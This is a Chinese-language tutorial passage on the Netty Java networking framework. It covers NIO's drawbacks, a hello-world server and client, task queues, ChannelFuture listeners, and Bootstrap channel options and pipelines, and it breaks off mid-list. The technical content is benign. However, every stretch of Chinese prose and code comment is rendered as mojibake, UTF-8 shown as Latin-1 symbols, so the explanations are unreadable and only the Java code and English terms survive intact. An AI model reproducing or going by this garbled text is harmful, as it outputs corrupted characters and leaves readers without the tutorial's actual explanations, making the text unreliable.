å‰è¨€æœ¬æ–‡ä¸»è¦è®²è¿°Nettyæ¡†æ¶çš„ä¸€äº›ç‰¹æ€§ä»¥åŠé‡è¦ç»„ä»¶ï¼Œå¸Œæœ›çœ‹å®Œä¹‹åèƒ½å¯¹Nettyæ¡†æ¶æœ‰ä¸€ä¸ªæ¯”è¾ƒç›´è§‚çš„æ„Ÿå—ï¼Œå¸Œæœ›èƒ½å¸®åŠ©è¯»è€…å¿«é€Ÿå…¥é—¨Nettyï¼Œå‡å°‘ä¸€äº›å¼¯è·¯ã€‚ ä¸€ã€Nettyæ¦‚è¿°å®˜æ–¹çš„ä»‹ç»ï¼š Netty is an asynchronous event-driven network application frameworkfor rapid development of maintainable high performance protocol servers &amp; clients. Nettyæ˜¯ ä¸€ä¸ªå¼‚æ­¥äº‹ä»¶é©±åŠ¨çš„ç½‘ç»œåº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œç”¨äºå¿«é€Ÿå¼€å‘å¯ç»´æŠ¤çš„é«˜æ€§èƒ½åè®®æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ã€‚ äºŒã€ä¸ºä»€ä¹ˆä½¿ç”¨Nettyä»å®˜ç½‘ä¸Šä»‹ç»ï¼ŒNettyæ˜¯ä¸€ä¸ªç½‘ç»œåº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œå¼€å‘æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ã€‚ä¹Ÿå°±æ˜¯ç”¨äºç½‘ç»œç¼–ç¨‹çš„ä¸€ä¸ªæ¡†æ¶ã€‚æ—¢ç„¶æ˜¯ç½‘ç»œç¼–ç¨‹ï¼ŒSocketå°±ä¸è°ˆäº†ï¼Œä¸ºä»€ä¹ˆä¸ç”¨NIOå‘¢ï¼Ÿ 2.1 NIOçš„ç¼ºç‚¹å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œä¹‹å‰æˆ‘å†™äº†ä¸€ç¯‡æ–‡ç« ã€ŠNIOå…¥é—¨ã€‹å¯¹NIOæœ‰æ¯”è¾ƒè¯¦ç»†çš„ä»‹ç»ï¼ŒNIOçš„ä¸»è¦é—®é¢˜æ˜¯ï¼š NIOçš„ç±»åº“å’ŒAPIç¹æ‚ï¼Œå­¦ä¹ æˆæœ¬é«˜ï¼Œä½ éœ€è¦ç†Ÿç»ƒæŒæ¡Selectorã€ServerSocketChannelã€SocketChannelã€ByteBufferç­‰ã€‚ éœ€è¦ç†Ÿæ‚‰Javaå¤šçº¿ç¨‹ç¼–ç¨‹ã€‚è¿™æ˜¯å› ä¸ºNIOç¼–ç¨‹æ¶‰åŠåˆ°Reactoræ¨¡å¼ï¼Œä½ å¿…é¡»å¯¹å¤šçº¿ç¨‹å’Œç½‘ç»œç¼–ç¨‹éå¸¸ç†Ÿæ‚‰ï¼Œæ‰èƒ½å†™å‡ºé«˜è´¨é‡çš„NIOç¨‹åºã€‚ è‡­åæ˜­è‘—çš„epoll bugã€‚å®ƒä¼šå¯¼è‡´Selectorç©ºè½®è¯¢ï¼Œæœ€ç»ˆå¯¼è‡´CPU 100%ã€‚ç›´åˆ°JDK1.7ç‰ˆæœ¬ä¾ç„¶æ²¡å¾—åˆ°æ ¹æœ¬æ€§çš„è§£å†³ã€‚ 2.2 Nettyçš„ä¼˜ç‚¹ç›¸å¯¹åœ°ï¼ŒNettyçš„ä¼˜ç‚¹æœ‰å¾ˆå¤šï¼š APIä½¿ç”¨ç®€å•ï¼Œå­¦ä¹ æˆæœ¬ä½ã€‚ åŠŸèƒ½å¼ºå¤§ï¼Œå†…ç½®äº†å¤šç§è§£ç ç¼–ç å™¨ï¼Œæ”¯æŒå¤šç§åè®®ã€‚ æ€§èƒ½é«˜ï¼Œå¯¹æ¯”å…¶ä»–ä¸»æµçš„NIOæ¡†æ¶ï¼ŒNettyçš„æ€§èƒ½æœ€ä¼˜ã€‚ ç¤¾åŒºæ´»è·ƒï¼Œå‘ç°BUGä¼šåŠæ—¶ä¿®å¤ï¼Œè¿­ä»£ç‰ˆæœ¬å‘¨æœŸçŸ­ï¼Œä¸æ–­åŠ å…¥æ–°çš„åŠŸèƒ½ã€‚ Dubboã€Elasticsearchéƒ½é‡‡ç”¨äº†Nettyï¼Œè´¨é‡å¾—åˆ°éªŒè¯ã€‚ ä¸‰ã€æ¶æ„å›¾image.png ä¸Šé¢è¿™å¼ å›¾å°±æ˜¯åœ¨å®˜ç½‘é¦–é¡µçš„æ¶æ„å›¾ï¼Œæˆ‘ä»¬ä»ä¸Šåˆ°ä¸‹åˆ†æä¸€ä¸‹ã€‚ ç»¿è‰²çš„éƒ¨åˆ†Coreæ ¸å¿ƒæ¨¡å—ï¼ŒåŒ…æ‹¬é›¶æ‹·è´ã€APIåº“ã€å¯æ‰©å±•çš„äº‹ä»¶æ¨¡å‹ã€‚ æ©™è‰²éƒ¨åˆ†Protocol Supportåè®®æ”¯æŒï¼ŒåŒ…æ‹¬Httpåè®®ã€webSocketã€SSL(å®‰å…¨å¥—æ¥å­—åè®®)ã€è°·æ­ŒProtobufåè®®ã€zlib/gzipå‹ç¼©ä¸è§£å‹ç¼©ã€Large File Transferå¤§æ–‡ä»¶ä¼ è¾“ç­‰ç­‰ã€‚ çº¢è‰²çš„éƒ¨åˆ†Transport Servicesä¼ è¾“æœåŠ¡ï¼ŒåŒ…æ‹¬Socketã€Datagramã€Http Tunnelç­‰ç­‰ã€‚ ä»¥ä¸Šå¯çœ‹å‡ºNettyçš„åŠŸèƒ½ã€åè®®ã€ä¼ è¾“æ–¹å¼éƒ½æ¯”è¾ƒå…¨ï¼Œæ¯”è¾ƒå¼ºå¤§ã€‚ å››ã€æ°¸è¿œçš„Hello Wordé¦–å…ˆæ­å»ºä¸€ä¸ªHelloWordå·¥ç¨‹ï¼Œå…ˆç†Ÿæ‚‰ä¸€ä¸‹APIï¼Œè¿˜æœ‰ä¸ºåé¢çš„å­¦ä¹ åšé“ºå«ã€‚ä»¥ä¸‹é¢è¿™å¼ å›¾ä¸ºä¾æ®ï¼š image.png 4.1 å¼•å…¥Mavenä¾èµ–ä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯4.1.20ï¼Œç›¸å¯¹æ¯”è¾ƒç¨³å®šçš„ä¸€ä¸ªç‰ˆæœ¬ã€‚ &lt;dependency&gt; &lt;groupId&gt;io.netty&lt;/groupId&gt; &lt;artifactId&gt;netty-all&lt;/artifactId&gt; &lt;version&gt;4.1.20.Final&lt;/version&gt; &lt;/dependency&gt; 4.2 åˆ›å»ºæœåŠ¡ç«¯å¯åŠ¨ç±»public class MyServer { public static void main(String[] args) throws Exception { //åˆ›å»ºä¸¤ä¸ªçº¿ç¨‹ç»„ boosGroupã€workerGroup EventLoopGroup bossGroup = new NioEventLoopGroup(); EventLoopGroup workerGroup = new NioEventLoopGroup(); try { //åˆ›å»ºæœåŠ¡ç«¯çš„å¯åŠ¨å¯¹è±¡ï¼Œè®¾ç½®å‚æ•° ServerBootstrap bootstrap = new ServerBootstrap(); //è®¾ç½®ä¸¤ä¸ªçº¿ç¨‹ç»„boosGroupå’ŒworkerGroup bootstrap.group(bossGroup, workerGroup) //è®¾ç½®æœåŠ¡ç«¯é€šé“å®ç°ç±»å‹ .channel(NioServerSocketChannel.class) //è®¾ç½®çº¿ç¨‹é˜Ÿåˆ—å¾—åˆ°è¿æ¥ä¸ªæ•° .option(ChannelOption.SO_BACKLOG, 128) //è®¾ç½®ä¿æŒæ´»åŠ¨è¿æ¥çŠ¶æ€ .childOption(ChannelOption.SO_KEEPALIVE, true) //ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»çš„å½¢å¼åˆå§‹åŒ–é€šé“å¯¹è±¡ .childHandler(new ChannelInitializer&lt;SocketChannel&gt;() { @Override protected void initChannel(SocketChannel socketChannel) throws Exception { //ç»™pipelineç®¡é“è®¾ç½®å¤„ç†å™¨ socketChannel.pipeline().addLast(new MyServerHandler()); } });//ç»™workerGroupçš„EventLoopå¯¹åº”çš„ç®¡é“è®¾ç½®å¤„ç†å™¨ System.out.println(&quot;javaæŠ€æœ¯çˆ±å¥½è€…çš„æœåŠ¡ç«¯å·²ç»å‡†å¤‡å°±ç»ª...&quot;); //ç»‘å®šç«¯å£å·ï¼Œå¯åŠ¨æœåŠ¡ç«¯ ChannelFuture channelFuture = bootstrap.bind(6666).sync(); //å¯¹å…³é—­é€šé“è¿›è¡Œç›‘å¬ channelFuture.channel().closeFuture().sync(); } finally { bossGroup.shutdownGracefully(); workerGroup.shutdownGracefully(); } } } 4.3 åˆ›å»ºæœåŠ¡ç«¯å¤„ç†å™¨/** * è‡ªå®šä¹‰çš„Handleréœ€è¦ç»§æ‰¿Nettyè§„å®šå¥½çš„HandlerAdapter * æ‰èƒ½è¢«Nettyæ¡†æ¶æ‰€å…³è”ï¼Œæœ‰ç‚¹ç±»ä¼¼SpringMVCçš„é€‚é…å™¨æ¨¡å¼ **/ public class MyServerHandler extends ChannelInboundHandlerAdapter { @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception { //è·å–å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„æ¶ˆæ¯ ByteBuf byteBuf = (ByteBuf) msg; System.out.println(&quot;æ”¶åˆ°å®¢æˆ·ç«¯&quot; + ctx.channel().remoteAddress() + &quot;å‘é€çš„æ¶ˆæ¯ï¼š&quot; + byteBuf.toString(CharsetUtil.UTF_8)); } @Override public void channelReadComplete(ChannelHandlerContext ctx) throws Exception { //å‘é€æ¶ˆæ¯ç»™å®¢æˆ·ç«¯ ctx.writeAndFlush(Unpooled.copiedBuffer(&quot;æœåŠ¡ç«¯å·²æ”¶åˆ°æ¶ˆæ¯ï¼Œå¹¶ç»™ä½ å‘é€ä¸€ä¸ªé—®å·?&quot;, CharsetUtil.UTF_8)); } @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception { //å‘ç”Ÿå¼‚å¸¸ï¼Œå…³é—­é€šé“ ctx.close(); } } 4.4 åˆ›å»ºå®¢æˆ·ç«¯å¯åŠ¨ç±»public class MyClient { public static void main(String[] args) throws Exception { NioEventLoopGroup eventExecutors = new NioEventLoopGroup(); try { //åˆ›å»ºbootstrapå¯¹è±¡ï¼Œé…ç½®å‚æ•° Bootstrap bootstrap = new Bootstrap(); //è®¾ç½®çº¿ç¨‹ç»„ bootstrap.group(eventExecutors) //è®¾ç½®å®¢æˆ·ç«¯çš„é€šé“å®ç°ç±»å‹ .channel(NioSocketChannel.class) //ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»åˆå§‹åŒ–é€šé“ .handler(new ChannelInitializer&lt;SocketChannel&gt;() { @Override protected void initChannel(SocketChannel ch) throws Exception { //æ·»åŠ å®¢æˆ·ç«¯é€šé“çš„å¤„ç†å™¨ ch.pipeline().addLast(new MyClientHandler()); } }); System.out.println(&quot;å®¢æˆ·ç«¯å‡†å¤‡å°±ç»ªï¼Œéšæ—¶å¯ä»¥èµ·é£~&quot;); //è¿æ¥æœåŠ¡ç«¯ ChannelFuture channelFuture = bootstrap.connect(&quot;127.0.0.1&quot;, 6666).sync(); //å¯¹é€šé“å…³é—­è¿›è¡Œç›‘å¬ channelFuture.channel().closeFuture().sync(); } finally { //å…³é—­çº¿ç¨‹ç»„ eventExecutors.shutdownGracefully(); } } } 4.5 åˆ›å»ºå®¢æˆ·ç«¯å¤„ç†å™¨public class MyClientHandler extends ChannelInboundHandlerAdapter { @Override public void channelActive(ChannelHandlerContext ctx) throws Exception { //å‘é€æ¶ˆæ¯åˆ°æœåŠ¡ç«¯ ctx.writeAndFlush(Unpooled.copiedBuffer(&quot;æ­ªæ¯”å·´åœ~èŒ‰è‰~Are you good~é©¬æ¥è¥¿äºš~&quot;, CharsetUtil.UTF_8)); } @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception { //æ¥æ”¶æœåŠ¡ç«¯å‘é€è¿‡æ¥çš„æ¶ˆæ¯ ByteBuf byteBuf = (ByteBuf) msg; System.out.println(&quot;æ”¶åˆ°æœåŠ¡ç«¯&quot; + ctx.channel().remoteAddress() + &quot;çš„æ¶ˆæ¯ï¼š&quot; + byteBuf.toString(CharsetUtil.UTF_8)); } } 4.6 æµ‹è¯•å…ˆå¯åŠ¨æœåŠ¡ç«¯ï¼Œå†å¯åŠ¨å®¢æˆ·ç«¯ï¼Œå°±å¯ä»¥çœ‹åˆ°ç»“æœï¼š MyServeræ‰“å°ç»“æœ: image.png MyClientæ‰“å°ç»“æœï¼š äº”ã€Nettyçš„ç‰¹æ€§ä¸é‡è¦ç»„ä»¶5.1 taskQueueä»»åŠ¡é˜Ÿåˆ—å¦‚æœHandlerå¤„ç†å™¨æœ‰ä¸€äº›é•¿æ—¶é—´çš„ä¸šåŠ¡å¤„ç†ï¼Œå¯ä»¥äº¤ç»™taskQueueå¼‚æ­¥å¤„ç†ã€‚æ€ä¹ˆç”¨å‘¢ï¼Œè¯·çœ‹ä»£ç æ¼”ç¤ºï¼š public class MyServerHandler extends ChannelInboundHandlerAdapter { @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception { //è·å–åˆ°çº¿ç¨‹æ± eventLoopï¼Œæ·»åŠ çº¿ç¨‹ï¼Œæ‰§è¡Œ ctx.channel().eventLoop().execute(new Runnable() { @Override public void run() { try { //é•¿æ—¶é—´æ“ä½œï¼Œä¸è‡³äºé•¿æ—¶é—´çš„ä¸šåŠ¡æ“ä½œå¯¼è‡´Handleré˜»å¡ Thread.sleep(1000); System.out.println(&quot;é•¿æ—¶é—´çš„ä¸šåŠ¡å¤„ç†&quot;); } catch (Exception e) { e.printStackTrace(); } } }); } } æˆ‘ä»¬æ‰“ä¸€ä¸ªdebugè°ƒè¯•ï¼Œæ˜¯å¯ä»¥çœ‹åˆ°æ·»åŠ è¿›å»çš„taskQueueæœ‰ä¸€ä¸ªä»»åŠ¡ã€‚ image.png 5.2 scheduleTaskQueueå»¶æ—¶ä»»åŠ¡é˜Ÿåˆ—å»¶æ—¶ä»»åŠ¡é˜Ÿåˆ—å’Œä¸Šé¢ä»‹ç»çš„ä»»åŠ¡é˜Ÿåˆ—éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¤šäº†ä¸€ä¸ªå¯å»¶è¿Ÿä¸€å®šæ—¶é—´å†æ‰§è¡Œçš„è®¾ç½®ï¼Œè¯·çœ‹ä»£ç æ¼”ç¤ºï¼š ctx.channel().eventLoop().schedule(new Runnable() { @Override public void run() { try { //é•¿æ—¶é—´æ“ä½œï¼Œä¸è‡³äºé•¿æ—¶é—´çš„ä¸šåŠ¡æ“ä½œå¯¼è‡´Handleré˜»å¡ Thread.sleep(1000); System.out.println(&quot;é•¿æ—¶é—´çš„ä¸šåŠ¡å¤„ç†&quot;); } catch (Exception e) { e.printStackTrace(); } } },5, TimeUnit.SECONDS);//5ç§’åæ‰§è¡Œ ä¾ç„¶æ‰“å¼€debugè¿›è¡Œè°ƒè¯•æŸ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ä¸€ä¸ªscheduleTaskQueueä»»åŠ¡å¾…æ‰§è¡Œä¸­ img 5.3 Futureå¼‚æ­¥æœºåˆ¶åœ¨æ­å»ºHelloWordå·¥ç¨‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€è¡Œè¿™æ ·çš„ä»£ç ï¼š ChannelFuture channelFuture = bootstrap.connect(&quot;127.0.0.1&quot;, 6666); å¾ˆå¤šæ“ä½œéƒ½è¿”å›è¿™ä¸ªChannelFutureå¯¹è±¡ï¼Œç©¶ç«Ÿè¿™ä¸ªChannelFutureå¯¹è±¡æ˜¯ç”¨æ¥åšä»€ä¹ˆçš„å‘¢ï¼Ÿ ChannelFutureæä¾›æ“ä½œå®Œæˆæ—¶ä¸€ç§å¼‚æ­¥é€šçŸ¥çš„æ–¹å¼ã€‚ä¸€èˆ¬åœ¨Socketç¼–ç¨‹ä¸­ï¼Œç­‰å¾…å“åº”ç»“æœéƒ½æ˜¯åŒæ­¥é˜»å¡çš„ï¼Œè€ŒNettyåˆ™ä¸ä¼šé€ æˆé˜»å¡ï¼Œå› ä¸ºChannelFutureæ˜¯é‡‡å–ç±»ä¼¼è§‚å¯Ÿè€…æ¨¡å¼çš„å½¢å¼è¿›è¡Œè·å–ç»“æœã€‚è¯·çœ‹ä¸€æ®µä»£ç æ¼”ç¤ºï¼š //æ·»åŠ ç›‘å¬å™¨ channelFuture.addListener(new ChannelFutureListener() { //ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»ï¼ŒChannelFutureListeneræ¥å£ //é‡å†™operationCompleteæ–¹æ³• @Override public void operationComplete(ChannelFuture future) throws Exception { //åˆ¤æ–­æ˜¯å¦æ“ä½œæˆåŠŸ if (future.isSuccess()) { System.out.println(&quot;è¿æ¥æˆåŠŸ&quot;); } else { System.out.println(&quot;è¿æ¥å¤±è´¥&quot;); } } }); 5.4 Bootstrapä¸ServerBootStrapBootstrapå’ŒServerBootStrapæ˜¯Nettyæä¾›çš„ä¸€ä¸ªåˆ›å»ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å¯åŠ¨å™¨çš„å·¥å‚ç±»ï¼Œä½¿ç”¨è¿™ä¸ªå·¥å‚ç±»éå¸¸ä¾¿åˆ©åœ°åˆ›å»ºå¯åŠ¨ç±»ï¼Œæ ¹æ®ä¸Šé¢çš„ä¸€äº›ä¾‹å­ï¼Œå…¶å®ä¹Ÿçœ‹å¾—å‡ºæ¥èƒ½å¤§å¤§åœ°å‡å°‘äº†å¼€å‘çš„éš¾åº¦ã€‚é¦–å…ˆçœ‹ä¸€ä¸ªç±»å›¾ï¼š image.png å¯ä»¥çœ‹å‡ºéƒ½æ˜¯ç»§æ‰¿äºAbstractBootStrapæŠ½è±¡ç±»ï¼Œæ‰€ä»¥å¤§è‡´ä¸Šçš„é…ç½®æ–¹æ³•éƒ½ç›¸åŒã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œä½¿ç”¨Bootstrapåˆ›å»ºå¯åŠ¨å™¨çš„æ­¥éª¤å¯åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š image.png 5.4.1 group()åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ã€ŠReactoræ¨¡å¼ã€‹ä¸­ï¼Œæˆ‘ä»¬å°±è®²è¿‡æœåŠ¡ç«¯è¦ä½¿ç”¨ä¸¤ä¸ªçº¿ç¨‹ç»„ï¼š bossGroup ç”¨äºç›‘å¬å®¢æˆ·ç«¯è¿æ¥ï¼Œä¸“é—¨è´Ÿè´£ä¸å®¢æˆ·ç«¯åˆ›å»ºè¿æ¥ï¼Œå¹¶æŠŠè¿æ¥æ³¨å†Œåˆ°workerGroupçš„Selectorä¸­ã€‚ workerGroupç”¨äºå¤„ç†æ¯ä¸€ä¸ªè¿æ¥å‘ç”Ÿçš„è¯»å†™äº‹ä»¶ã€‚ ä¸€èˆ¬åˆ›å»ºçº¿ç¨‹ç»„ç›´æ¥ä½¿ç”¨ä»¥ä¸‹newå°±å®Œäº‹äº†ï¼š EventLoopGroup bossGroup = new NioEventLoopGroup(); EventLoopGroup workerGroup = new NioEventLoopGroup(); æœ‰ç‚¹å¥½å¥‡çš„æ˜¯ï¼Œæ—¢ç„¶æ˜¯çº¿ç¨‹ç»„ï¼Œé‚£çº¿ç¨‹æ•°é»˜è®¤æ˜¯å¤šå°‘å‘¢ï¼Ÿæ·±å…¥æºç ï¼š //ä½¿ç”¨ä¸€ä¸ªå¸¸é‡ä¿å­˜ private static final int DEFAULT_EVENT_LOOP_THREADS; static { //NettyRuntime.availableProcessors() * 2ï¼Œcpuæ ¸æ•°çš„ä¸¤å€èµ‹å€¼ç»™å¸¸é‡ DEFAULT_EVENT_LOOP_THREADS = Math.max(1, SystemPropertyUtil.getInt( &quot;io.netty.eventLoopThreads&quot;, NettyRuntime.availableProcessors() * 2)); if (logger.isDebugEnabled()) { logger.debug(&quot;-Dio.netty.eventLoopThreads: {}&quot;, DEFAULT_EVENT_LOOP_THREADS); } } protected MultithreadEventLoopGroup(int nThreads, Executor executor, Object... args) { //å¦‚æœä¸ä¼ å…¥ï¼Œåˆ™ä½¿ç”¨å¸¸é‡çš„å€¼ï¼Œä¹Ÿå°±æ˜¯cpuæ ¸æ•°çš„ä¸¤å€ super(nThreads == 0 ? DEFAULT_EVENT_LOOP_THREADS : nThreads, executor, args); } é€šè¿‡æºç å¯ä»¥çœ‹åˆ°ï¼Œé»˜è®¤çš„çº¿ç¨‹æ•°æ˜¯cpuæ ¸æ•°çš„ä¸¤å€ã€‚å‡è®¾æƒ³è‡ªå®šä¹‰çº¿ç¨‹æ•°ï¼Œå¯ä»¥ä½¿ç”¨æœ‰å‚æ„é€ å™¨ï¼š //è®¾ç½®bossGroupçº¿ç¨‹æ•°ä¸º1 EventLoopGroup bossGroup = new NioEventLoopGroup(1); //è®¾ç½®workerGroupçº¿ç¨‹æ•°ä¸º16 EventLoopGroup workerGroup = new NioEventLoopGroup(16); 5.4.2 channel()è¿™ä¸ªæ–¹æ³•ç”¨äºè®¾ç½®é€šé“ç±»å‹ï¼Œå½“å»ºç«‹è¿æ¥åï¼Œä¼šæ ¹æ®è¿™ä¸ªè®¾ç½®åˆ›å»ºå¯¹åº”çš„Channelå®ä¾‹ã€‚ img ä½¿ç”¨debugæ¨¡å¼å¯ä»¥çœ‹åˆ° img é€šé“ç±»å‹æœ‰ä»¥ä¸‹ï¼š NioSocketChannelï¼š å¼‚æ­¥éé˜»å¡çš„å®¢æˆ·ç«¯ TCP Socket è¿æ¥ã€‚ NioServerSocketChannelï¼š å¼‚æ­¥éé˜»å¡çš„æœåŠ¡å™¨ç«¯ TCP Socket è¿æ¥ã€‚ å¸¸ç”¨çš„å°±æ˜¯è¿™ä¸¤ä¸ªé€šé“ç±»å‹ï¼Œå› ä¸ºæ˜¯å¼‚æ­¥éé˜»å¡çš„ã€‚æ‰€ä»¥æ˜¯é¦–é€‰ã€‚ OioSocketChannelï¼š åŒæ­¥é˜»å¡çš„å®¢æˆ·ç«¯ TCP Socket è¿æ¥ã€‚ OioServerSocketChannelï¼š åŒæ­¥é˜»å¡çš„æœåŠ¡å™¨ç«¯ TCP Socket è¿æ¥ã€‚ ç¨å¾®åœ¨æœ¬åœ°è°ƒè¯•è¿‡ï¼Œç”¨èµ·æ¥å’ŒNioæœ‰ä¸€äº›ä¸åŒï¼Œæ˜¯é˜»å¡çš„ï¼Œæ‰€ä»¥APIè°ƒç”¨ä¹Ÿä¸ä¸€æ ·ã€‚å› ä¸ºæ˜¯é˜»å¡çš„IOï¼Œå‡ ä¹æ²¡ä»€ä¹ˆäººä¼šé€‰æ‹©ä½¿ç”¨Oioï¼Œæ‰€ä»¥ä¹Ÿå¾ˆéš¾æ‰¾åˆ°ä¾‹å­ã€‚æˆ‘ç¨å¾®ç¢ç£¨äº†ä¸€ä¸‹ï¼Œç»è¿‡å‡ æ¬¡æŠ¥é”™ä¹‹åï¼Œæ€»ç®—è°ƒé€šäº†ã€‚ä»£ç å¦‚ä¸‹ï¼š //serverç«¯ä»£ç ï¼Œè·Ÿä¸Šé¢å‡ ä¹ä¸€æ ·ï¼Œåªéœ€æ”¹ä¸‰ä¸ªåœ°æ–¹ //è¿™ä¸ªåœ°æ–¹ä½¿ç”¨çš„æ˜¯OioEventLoopGroup EventLoopGroup bossGroup = new OioEventLoopGroup(); ServerBootstrap bootstrap = new ServerBootstrap(); bootstrap.group(bossGroup)//åªéœ€è¦è®¾ç½®ä¸€ä¸ªçº¿ç¨‹ç»„boosGroup .channel(OioServerSocketChannel.class)//è®¾ç½®æœåŠ¡ç«¯é€šé“å®ç°ç±»å‹ //clientç«¯ä»£ç ï¼Œåªéœ€æ”¹ä¸¤ä¸ªåœ°æ–¹ //ä½¿ç”¨çš„æ˜¯OioEventLoopGroup EventLoopGroup eventExecutors = new OioEventLoopGroup(); //é€šé“ç±»å‹è®¾ç½®ä¸ºOioSocketChannel bootstrap.group(eventExecutors)//è®¾ç½®çº¿ç¨‹ç»„ .channel(OioSocketChannel.class)//è®¾ç½®å®¢æˆ·ç«¯çš„é€šé“å®ç°ç±»å‹ NioSctpChannelï¼š å¼‚æ­¥çš„å®¢æˆ·ç«¯ Sctpï¼ˆStream Control Transmission Protocolï¼Œæµæ§åˆ¶ä¼ è¾“åè®®ï¼‰è¿æ¥ã€‚ NioSctpServerChannelï¼š å¼‚æ­¥çš„ Sctp æœåŠ¡å™¨ç«¯è¿æ¥ã€‚ æœ¬åœ°æ²¡å¯åŠ¨æˆåŠŸï¼Œç½‘ä¸Šçœ‹äº†ä¸€äº›ç½‘å‹çš„è¯„è®ºï¼Œè¯´æ˜¯åªèƒ½åœ¨linuxç¯å¢ƒä¸‹æ‰å¯ä»¥å¯åŠ¨ã€‚ä»æŠ¥é”™ä¿¡æ¯çœ‹ï¼šSCTP not supported on this platformï¼Œä¸æ”¯æŒè¿™ä¸ªå¹³å°ã€‚å› ä¸ºæˆ‘ç”µè„‘æ˜¯windowç³»ç»Ÿï¼Œæ‰€ä»¥ç½‘å‹è¯´çš„æœ‰ç‚¹é“ç†ã€‚ 5.4.3 option()ä¸childOption()é¦–å…ˆè¯´ä¸€ä¸‹è¿™ä¸¤ä¸ªçš„åŒºåˆ«ã€‚ option()è®¾ç½®çš„æ˜¯æœåŠ¡ç«¯ç”¨äºæ¥æ”¶è¿›æ¥çš„è¿æ¥ï¼Œä¹Ÿå°±æ˜¯boosGroupçº¿ç¨‹ã€‚ childOption()æ˜¯æä¾›ç»™çˆ¶ç®¡é“æ¥æ”¶åˆ°çš„è¿æ¥ï¼Œä¹Ÿå°±æ˜¯workerGroupçº¿ç¨‹ã€‚ ææ¸…æ¥šäº†ä¹‹åï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å¸¸ç”¨çš„ä¸€äº›è®¾ç½®æœ‰å“ªäº›ï¼š SocketChannelå‚æ•°ï¼Œä¹Ÿå°±æ˜¯childOption()å¸¸ç”¨çš„å‚æ•°ï¼š SO_RCVBUF Socketå‚æ•°ï¼ŒTCPæ•°æ®æ¥æ”¶ç¼“å†²åŒºå¤§å°ã€‚TCP_NODELAY TCPå‚æ•°ï¼Œç«‹å³å‘é€æ•°æ®ï¼Œé»˜è®¤å€¼ä¸ºTureã€‚SO_KEEPALIVE Socketå‚æ•°ï¼Œè¿æ¥ä¿æ´»ï¼Œé»˜è®¤å€¼ä¸ºFalseã€‚å¯ç”¨è¯¥åŠŸèƒ½æ—¶ï¼ŒTCPä¼šä¸»åŠ¨æ¢æµ‹ç©ºé—²è¿æ¥çš„æœ‰æ•ˆæ€§ã€‚ ServerSocketChannelå‚æ•°ï¼Œä¹Ÿå°±æ˜¯option()å¸¸ç”¨å‚æ•°ï¼š SO_BACKLOG Socketå‚æ•°ï¼ŒæœåŠ¡ç«¯æ¥å—è¿æ¥çš„é˜Ÿåˆ—é•¿åº¦ï¼Œå¦‚æœé˜Ÿåˆ—å·²æ»¡ï¼Œå®¢æˆ·ç«¯è¿æ¥å°†è¢«æ‹’ç»ã€‚é»˜è®¤å€¼ï¼ŒWindowsä¸º200ï¼Œå…¶ä»–ä¸º128ã€‚ ç”±äºç¯‡å¹…é™åˆ¶ï¼Œå…¶ä»–å°±ä¸åˆ—ä¸¾äº†ï¼Œå¤§å®¶å¯ä»¥å»ç½‘ä¸Šæ‰¾èµ„æ–™çœ‹çœ‹ï¼Œäº†è§£ä¸€ä¸‹ã€‚ 5.4.4 è®¾ç½®æµæ°´çº¿(é‡ç‚¹)ChannelPipelineæ˜¯Nettyå¤„ç†è¯·æ±‚çš„è´£ä»»é“¾ï¼ŒChannelHandleråˆ™æ˜¯å…·ä½“å¤„ç†è¯·æ±‚çš„å¤„ç†å™¨ã€‚å®é™…ä¸Šæ¯ä¸€ä¸ªchanneléƒ½æœ‰ä¸€ä¸ªå¤„ç†å™¨çš„æµæ°´çº¿ã€‚ åœ¨Bootstrapä¸­childHandler()æ–¹æ³•éœ€è¦åˆå§‹åŒ–é€šé“ï¼Œå®ä¾‹åŒ–ä¸€ä¸ªChannelInitializerï¼Œè¿™æ—¶å€™éœ€è¦é‡å†™initChannel()åˆå§‹åŒ–é€šé“çš„æ–¹æ³•ï¼Œè£…é…æµæ°´çº¿å°±æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹è¿›è¡Œã€‚ä»£ç æ¼”ç¤ºå¦‚ä¸‹ï¼š //ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»çš„å½¢å¼åˆå§‹åŒ–é€šé“å¯¹è±¡ bootstrap.childHandler(new ChannelInitializer&lt;SocketChannel&gt;() { @Override protected void initChannel(SocketChannel socketChannel) throws Exception { //ç»™pipelineç®¡é“è®¾ç½®è‡ªå®šä¹‰çš„å¤„ç†å™¨ socketChannel.pipeline().addLast(new MyServerHandler()); } }); å¤„ç†å™¨Handlerä¸»è¦åˆ†ä¸ºä¸¤ç§ï¼š ChannelInboundHandlerAdapter(å…¥ç«™å¤„ç†å™¨)ã€ChannelOutboundHandler(å‡ºç«™å¤„ç†å™¨) å…¥ç«™æŒ‡çš„æ˜¯æ•°æ®ä»åº•å±‚java NIO Channelåˆ°Nettyçš„Channelã€‚ å‡ºç«™æŒ‡çš„æ˜¯é€šè¿‡Nettyçš„Channelæ¥æ“ä½œåº•å±‚çš„java NIO Channelã€‚ ChannelInboundHandlerAdapterå¤„ç†å™¨å¸¸ç”¨çš„äº‹ä»¶æœ‰ï¼š æ³¨å†Œäº‹ä»¶ fireChannelRegisteredã€‚ è¿æ¥å»ºç«‹äº‹ä»¶ fireChannelActiveã€‚ 